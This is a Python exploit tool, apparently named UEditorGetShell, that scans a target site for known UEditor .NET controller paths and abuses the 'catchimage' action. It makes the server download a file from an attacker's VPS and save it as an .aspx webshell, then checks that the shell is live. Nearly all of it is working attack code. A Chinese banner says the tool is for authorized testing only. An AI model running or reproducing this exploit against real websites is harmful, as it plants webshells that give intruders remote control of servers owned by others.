import sys
import json
import click
import requests
from requests.exceptions import ChunkedEncodingError, ConnectionError, ConnectTimeout

def check_shell(url_path, path):

    url_path = url_path[0:url_path.rfind("/")+1]

    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
    }

    webshell_path = url_path + path

    try:
        r = requests.get(webshell_path, headers=headers, proxies=None, timeout=10, verify=False)
        if r.status_code == 200 or r.status_code == 500:
            return webshell_path
        else:
            info = "ERROR:未检测到webshell,可能被查杀..."
            return info
    except ConnectionError as e:
        return "ERROR:" + "HTTP连接错误"
    except ConnectTimeout as e:
        return "ERROR:" + "HTTP连接超时错误"
    except Exception as e:
        return 'ERROR:' + str(e)

def export(url,vps_add):

    headers = {
        "Content-Type":"application/x-www-form-urlencoded",
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
    }

    data = {
        "source[]":f"{vps_add}?.aspx"
    }

    try:
        r = requests.post(url, headers=headers, data=data, proxies=None, verify=False, timeout=30, files=None)
        if r.status_code == 200:
            html_dict = json.loads(r.text)
            if html_dict["state"] == "SUCCESS" and html_dict["list"][0]["url"] == "null":
                error_info = f"ERROR:{html_dict['list'][0]['state']}"
                return error_info
            elif html_dict["state"] == "SUCCESS" and html_dict["list"][0]["url"] != "null":
                shell_path = html_dict["list"][0]["url"]
                return shell_path
        else:
            error_info = "ERROR:" + "上传失败..."
            return error_info
    except ConnectionError as e:
        return "ERROR:" + "HTTP连接错误"
    except ConnectTimeout as e:
        return "ERROR:" + "HTTP连接超时错误"
    except Exception as e:
        return 'ERROR:' + str(e)

def probe_path(url):
    path_list = [
        "/ueditor/net/controller.ashx?action=catchimage",
        "/js/ueditor/net/controller.ashx?action=catchimage",
        "/static/ueditor/net/controller.ashx?action=catchimage",
        "/Scripts/Ueditor/net/controller.ashx?action=catchimage",
        "/Utility/UEditor?action=catchimage",
        "/Utility/UEditor/net?action=catchimage",
        "/Content/scripts/plugins/ueditor/net/controller.ashx?action=catchimage",
        "/static/admin/js/plugins/ueditor/net/controller.ashx?action=catchimage",
        "/ueditor_kejin/net/controller.ashx?action=catchimage",
        "/content/ueditor/net/controller.ashx?action=catchimage"
    ]

    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
    }

    if str(url).endswith("/"):
        url = url.strip("/")

    try:
        for i in path_list:
            r = requests.get(url + i, headers=headers, proxies=None, timeout=10, verify=False)
            if r.status_code == 200 and "state" in r.text:
                path = url + i
                return path
        return False
    except ConnectionError as e:
        return "ERROR:" + "HTTP连接错误"
    except ConnectTimeout as e:
        return "ERROR:" + "HTTP连接超时错误"
    except Exception as e:
        return 'ERROR:' + str(e)

def usage():
    print("")
    print("UEditorGetShell / UEditor编辑器GetShell")
    print("Code By:Jun_sheng @Github:https://github.com/jun-5heng/")
    print("橘子网络安全实验室 @https://0range.team/")
    print("")
    print("*************************警 告*****************************")
    print("本工具旨在帮助企业快速定位漏洞修复漏洞,仅限授权安全测试使用!")
    print("严格遵守《中华人民共和国网络安全法》,禁止未授权非法攻击站点!")
    print("***********************************************************")
    print("")

CONTEXT_SETTINGS = dict(help_option_names=['-h','--help'])

@click.command(context_settings=CONTEXT_SETTINGS)
@click.option('-u', '--url', required=True, help="URL地址")
@click.option('--vps_file', required=True, help="远程文件路径")
@click.option('--vul_path', help="自定义controller.ashx漏洞路径")
def main(url, vps_file, vul_path):

    usage()

    if url:
        if not vul_path:
            url_path = probe_path(url)
            if url_path.startswith("ERROR:"):
                click.secho(url_path, fg="red")
                sys.exit(0)
            elif not url_path:
                click.secho(f"[-] 内置路径探测结束,未发现漏洞路径", fg="red")
                sys.exit(0)
            elif url_path:
                click.secho("[+] 漏洞路径存在！", fg="green")
                click.secho(f"[INFO] 漏洞路径:{url_path}", fg="green")
                info = export(url_path, vps_file)
                if info.startswith("ERROR:"):
                    click.secho(f"{info}", fg="red")
                    sys.exit(0)
                elif info:
                    webshell_path =check_shell(url_path, info)
                    if not webshell_path.startswith("[-]"):
                        click.secho(f"[+] 利用成功,webshell:{webshell_path}")
                    else:
                        click.secho(f"{webshell_path}", fg="red")
        else:
            url_path = url + vul_path
            info = export(url_path, vps_file)
            if info.startswith("ERROR:"):
                click.secho(f"{info}", fg="red")
                sys.exit(0)
            elif info:
                webshell_path = check_shell(url_path, info)
                if not webshell_path.startswith("[-]"):
                    click.secho(f"[+] 利用成功,webshell:{webshell_path}")
                else:
                    click.secho(f"{webshell_path}", fg="red")

if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        click.secho(f"ERROR:{e}",fg="red")
        sys.exit(0)
